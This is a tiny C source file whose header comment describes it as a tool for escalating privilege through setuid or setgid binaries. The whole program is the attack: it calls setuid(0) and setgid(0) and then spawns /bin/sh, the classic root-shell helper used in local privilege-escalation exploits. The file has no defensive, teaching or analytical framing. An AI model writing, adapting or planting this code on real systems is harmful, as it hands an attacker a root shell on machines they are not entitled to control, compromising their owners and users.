/**
 * This executable will allow a binaries with sid or gid permissions to run this binary and escalate privilege' 
 * 
 */
 
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
